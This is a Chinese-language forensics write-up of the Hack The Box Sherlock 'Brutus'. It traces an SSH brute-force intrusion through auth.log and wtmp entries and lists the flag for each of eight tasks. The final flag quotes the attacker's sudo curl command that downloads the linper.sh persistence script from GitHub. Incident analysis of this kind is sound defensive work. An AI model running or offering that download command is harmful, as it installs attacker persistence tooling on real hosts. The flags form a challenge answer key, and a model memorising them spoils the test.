# HTB Sherlocks Brutus

题目附件：[下载地址](./attachments/Brutus.zip)

解压密码：`hacktheblue`

[官方 Writeup](./attachments/Sherlocks%20Brutus%20Official%20Writeup.pdf)

## 任务1

> 分析 auth.log。攻击者用于进行暴力破解的 IP 地址是什么？（x.x.x.x）

检索关键词 `Failed password`

FLAG：`65.2.161.68`

## 任务2

> 暴力破解尝试已成功，攻击者获得了服务器上某个账户的访问权限。该账户的用户名是什么？（***t）

检索关键词 `Accepted password`

FLAG：`root`

## 任务3

> 确定攻击者手动登录服务器并建立终端会话以执行其目标的 UTC 时间戳。登录时间与认证时间不同，可在 wtmp 工件中找到。（YYYY-MM-DD HH:MM:SS）

- 使用 last 命令

```bash
$ last -f wtmp -F
cyberjun pts/1        65.2.161.68      Wed Mar  6 14:37:35 2024   gone - no logout
root     pts/1        65.2.161.68      Wed Mar  6 14:32:45 2024 - Wed Mar  6 14:37:24 2024  (00:04)
root     pts/0        203.101.190.9    Wed Mar  6 14:19:55 2024   gone - no logout
reboot   system boot  6.2.0-1018-aws   Wed Mar  6 14:17:15 2024   still running
root     pts/1        203.101.190.9    Sun Feb 11 18:54:27 2024 - Sun Feb 11 19:08:04 2024  (00:13)
root     pts/1        203.101.190.9    Sun Feb 11 18:41:11 2024 - Sun Feb 11 18:41:46 2024  (00:00)
root     pts/0        203.101.190.9    Sun Feb 11 18:33:49 2024 - Sun Feb 11 19:08:04 2024  (00:34)
root     pts/0        203.101.190.9    Thu Jan 25 19:15:40 2024 - Thu Jan 25 20:34:34 2024  (01:18)
ubuntu   pts/0        203.101.190.9    Thu Jan 25 19:13:58 2024 - Thu Jan 25 19:15:12 2024  (00:01)
reboot   system boot  6.2.0-1017-aws   Thu Jan 25 19:12:17 2024 - Sun Feb 11 19:09:18 2024 (16+23:57)

wtmp begins Thu Jan 25 19:12:17 2024
```

- 使用提供的脚本

```bash
python3 utmp.py wtmp -o wtmp.out
```

FLAG：`2024-03-06 06:32:45`

## 任务4

> SSH 登录会话在登录时会被跟踪并分配一个会话编号。对于问题 2 中该用户账户的攻击者会话，被分配的会话编号是多少？（XX）

```
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

FLAG：`37`

## 任务5

> 攻击者在服务器上作为其持久化策略的一部分添加了一个新用户，并为该新用户账户赋予了更高的权限。该账户的名称是什么？

FLAG：`cyberjunkie`

## 任务6

> 通过创建新账户进行持久化所对应的 MITRE ATT&CK 子技术编号是什么？（TXXXX.XXX）

FLAG：`T1136.001`

## 任务7

> 根据 auth.log，攻击者的首次 SSH 会话在何时结束？（YYYY-MM-DD HH:MM:SS）

FLAG：`2024-03-06 06:37:24`

## 任务8

> 攻击者登录其后门账户并利用更高权限下载了一个脚本。使用 sudo 执行的完整命令是什么？

FLAG：`/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
